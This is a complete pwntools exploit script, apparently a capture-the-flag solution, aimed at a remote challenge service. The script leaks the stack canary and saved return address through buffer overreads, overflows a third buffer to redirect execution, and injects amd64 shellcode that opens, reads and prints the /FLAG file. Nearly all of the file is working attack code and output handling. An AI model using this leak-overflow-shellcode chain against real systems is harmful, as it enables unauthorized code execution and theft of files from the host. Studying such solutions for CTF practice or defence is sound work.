from pwn import *

# === Stack‐layout constants (measured from RBP) ===
RBP_TO_RET   = 0x08
RBP_TO_CANARY = 0x08
BUF1_TO_RBP   = 0x90
BUF2_TO_RBP   = 0x60 # buf1 - 0x30
BUF3_TO_RBP   = 0x30 # buf2 - 0x30

# Offset from the saved return address on the stack to the start of `msg`
RET_TO_MSG_OFFSET = 0xE5564


def leak_stack_canary(conn) -> bytes:
    """
    Reads until "What's your name? ", sends enough 'A's to reach
    just before the canary, then captures the lower 7 bytes of the canary
    (the highest byte is always 0x00).
    Returns the full 8-byte canary as a bytes object.
    """
    conn.recvuntil(b"What's your name? ")
    padding = b'A' * (BUF1_TO_RBP - RBP_TO_CANARY)
    conn.sendline(padding)

    # The next echo line contains our padding plus the canary's low 7 bytes
    leaked_tail = conn.recvlinesb(2)[1][:7]
    full_canary = b'\x00' + leaked_tail
    return full_canary


def leak_return_address(conn) -> int:
    """
    Reads until "What's the room number? ", sends padding to overflow
    up to the saved RIP (but stops one byte short so RIP itself is echoed).
    Returns the leaked RIP as an integer.
    """
    conn.recvuntil(b"What's the room number? ")
    padding = b'A' * (BUF2_TO_RBP + RBP_TO_RET - 1)
    conn.sendline(padding)

    leaked_bytes = conn.recvlinesb(2)[1][:8]
    return int.from_bytes(leaked_bytes, byteorder='little')


def build_overflow(canary: bytes, target_addr: int) -> bytes:
    """
    Constructs the final overflow payload:
      1. Fill from buf3 up to just before saved canary
      2. Insert the original canary (8 bytes)
      3. Overwrite saved RBP (8 bytes of junk)
      4. Overwrite saved RIP with target_addr (8 bytes, little‐endian)
    """
    prefix = b'A' * (BUF3_TO_RBP - RBP_TO_CANARY)
    saved_rbp_padding = b'B' * RBP_TO_RET
    return prefix + canary + saved_rbp_padding + target_addr.to_bytes(8, 'little')


def main():
    sc = """
        /* Push "/FLAG" onto the stack */
        mov    r11, 0x47414C462F        /* "/FLAG" in LE with zero padding */
        push   r11
        lea    rdi, [rsp]               /* rdi = address of "/FLAG" */
        xor    rsi, rsi                 /* rsi = 0 (O_RDONLY) */
        mov    rax, 0x2                 /* syscall: sys_open */
        syscall

        /* Read up to 128 bytes from fd into [rsp-0x80] */
        pop    r11                      /* clean up the "/FLAG" on stack */
        mov    rdi, rax                 /* rdi = returned fd */
        lea    rsi, [rsp - 0x80]        /* rsi = buffer address */
        mov    rdx, 0x80                /* rdx = 128 */
        xor    rax, rax                 /* syscall: sys_read */
        syscall

        /* Write the bytes just read to stdout */
        mov    rdi, 1                   /* rdi = 1 (stdout) */
        lea    rsi, [rsp - 0x80]        /* rsi = buffer */
        mov    rdx, rax                 /* rdx = number of bytes read */
        mov    rax, 1                   /* syscall: sys_write */
        syscall

        /* Exit cleanly */
        xor    rdi, rdi                 /* rdi = 0 (exit code) */
        mov    rax, 60                  /* syscall: sys_exit */
        syscall
    """
    shellcode = asm(sc, arch='amd64', os='linux')
    print(f"[+] Assembled shellcode length: {len(shellcode)} bytes")

    # -----------------------------------
    # Establish connection to challenge
    # -----------------------------------
    conn = remote('up.zoolab.org', 12343)

    # Leak the canary
    canary = leak_stack_canary(conn)
    canary_val = int.from_bytes(canary, byteorder='little')
    print(f"[+] Recovered canary = 0x{canary_val:x}")

    # Leak the saved RIP
    saved_rip = leak_return_address(conn)
    print(f"[+] Recovered return address = 0x{saved_rip:x}")

    # Compute where `msg` will reside at runtime
    msg_addr = saved_rip + RET_TO_MSG_OFFSET
    print(f"[+] Computed msg buffer address = 0x{msg_addr:x}")

    # Craft the overflow payload
    conn.recvuntil(b"What's the customer's name? ")
    overflow = build_overflow(canary, msg_addr)
    conn.sendline(overflow)

    # Finally, send the shellcode when prompted
    conn.recvuntil(b"Leave your message: ")
    conn.sendline(shellcode)

    # Read until the closing '}' of the flag
    flag_output = conn.recvuntil(b"}").decode()
    print(f"[+] Flag: {flag_output}")

    conn.close()


if __name__ == '__main__':
    main()
